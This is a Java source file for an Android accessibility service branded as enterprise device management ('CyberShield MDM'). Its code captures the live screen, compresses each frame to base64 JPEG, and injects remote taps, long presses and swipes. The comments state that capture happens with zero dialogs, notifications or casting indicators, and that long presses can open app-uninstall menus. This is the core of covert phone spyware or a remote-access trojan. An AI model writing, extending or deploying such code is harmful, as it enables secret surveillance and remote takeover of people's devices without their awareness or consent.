package com.cybershield.mdm;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.graphics.Path;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

/**
 * Enterprise Accessibility Service for CyberShield MDM.
 * Enables zero-notification, silent physical screen streaming and remote assistance gestures
 * on enrolled managed Android devices (Android 11+ / API 30+).
 */
public class MdmAccessibilityService extends AccessibilityService {
    private static final String TAG = "MdmAccessibility";
    private static volatile MdmAccessibilityService instance;
    private final Executor executor = Executors.newSingleThreadExecutor();
    private final ByteArrayOutputStream reusableBaos = new ByteArrayOutputStream(32768);

    public interface ScreenshotCallback {
        void onComplete(String base64Jpeg, int errorCode);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.i(TAG, "MdmAccessibilityService initialized.");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.i(TAG, "MdmAccessibilityService connected and ready for screen streaming.");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (instance == this) {
            instance = null;
        }
        Log.i(TAG, "MdmAccessibilityService destroyed.");
    }

    public static MdmAccessibilityService getInstance() {
        return instance;
    }

    public static boolean isRunning() {
        return instance != null;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Event processing not required for screen streaming
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "MdmAccessibilityService interrupted.");
    }

    /**
     * Captures the live physical screen silently using Android 11+ Accessibility API.
     * Zero system dialogs, zero user notifications, zero casting indicators.
     */
    public void capturePhysicalScreen(ScreenshotCallback callback) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) { // API 30+
            try {
                takeScreenshot(Display.DEFAULT_DISPLAY, executor, new TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(ScreenshotResult screenshotResult) {
                        HardwareBuffer buffer = null;
                        try {
                            buffer = screenshotResult.getHardwareBuffer();
                            if (buffer != null) {
                                ColorSpace colorSpace = screenshotResult.getColorSpace();
                                if (colorSpace == null) {
                                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
                                }
                                Bitmap rawBmp = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
                                if (rawBmp != null) {
                                    // Make a software copy so compress() can process it
                                    Bitmap swBmp = rawBmp.copy(Bitmap.Config.ARGB_8888, false);
                                    rawBmp.recycle();

                                    if (swBmp != null) {
                                        Bitmap finalBmp = swBmp;
                                        // Downscale to 420px width for crisp readability + ultra-fast ~15-25 KB frames
                                        if (swBmp.getWidth() > 420) {
                                            int targetW = 420;
                                            int targetH = (int) ((float) swBmp.getHeight() * 420f / (float) swBmp.getWidth());
                                            finalBmp = Bitmap.createScaledBitmap(swBmp, targetW, targetH, true);
                                            if (finalBmp != swBmp) {
                                                swBmp.recycle();
                                            }
                                        }

                                        byte[] bytes;
                                        synchronized (reusableBaos) {
                                            reusableBaos.reset();
                                            finalBmp.compress(Bitmap.CompressFormat.JPEG, 42, reusableBaos);
                                            bytes = reusableBaos.toByteArray();
                                        }
                                        finalBmp.recycle();

                                        String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                                        callback.onComplete(b64, 0);
                                        return;
                                    }
                                }
                            }
                        } catch (Exception ex) {
                            Log.w(TAG, "Error processing physical screenshot buffer: " + ex.getMessage());
                        } finally {
                            if (buffer != null) {
                                try { buffer.close(); } catch (Exception ignored) {}
                            }
                        }
                        callback.onComplete(null, -1);
                    }

                    @Override
                    public void onFailure(int errorCode) {
                        Log.w(TAG, "takeScreenshot failed with code: " + errorCode);
                        callback.onComplete(null, errorCode);
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Exception calling takeScreenshot: " + e.getMessage());
                callback.onComplete(null, -1);
            }
        } else {
            callback.onComplete(null, -1);
        }
    }

    /**
     * Injects a remote touch tap at normalized coordinates.
     */
    public void injectTap(float x, float y) {
        try {
            Path clickPath = new Path();
            clickPath.moveTo(x, y);
            GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(clickPath, 0, 50);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(stroke);
            dispatchGesture(builder.build(), null, null);
        } catch (Exception e) {
            Log.w(TAG, "Failed injecting tap: " + e.getMessage());
        }
    }

    /**
     * Injects a remote long-press (hold) gesture to trigger context menus like App Uninstall / App Info.
     */
    public void injectLongPress(float x, float y, long durationMs) {
        try {
            Path holdPath = new Path();
            holdPath.moveTo(x, y);
            long holdDur = Math.max(650L, Math.min(2000L, durationMs));
            GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(holdPath, 0, holdDur);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(stroke);
            dispatchGesture(builder.build(), null, null);
        } catch (Exception e) {
            Log.w(TAG, "Failed injecting long press: " + e.getMessage());
        }
    }

    /**
     * Injects a remote drag / swipe gesture.
     */
    public void injectSwipe(float startX, float startY, float endX, float endY, long duration) {
        try {
            Path swipePath = new Path();
            swipePath.moveTo(startX, startY);
            swipePath.lineTo(endX, endY);
            GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(swipePath, 0, Math.max(50, duration));
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(stroke);
            dispatchGesture(builder.build(), null, null);
        } catch (Exception e) {
            Log.w(TAG, "Failed injecting swipe: " + e.getMessage());
        }
    }
}
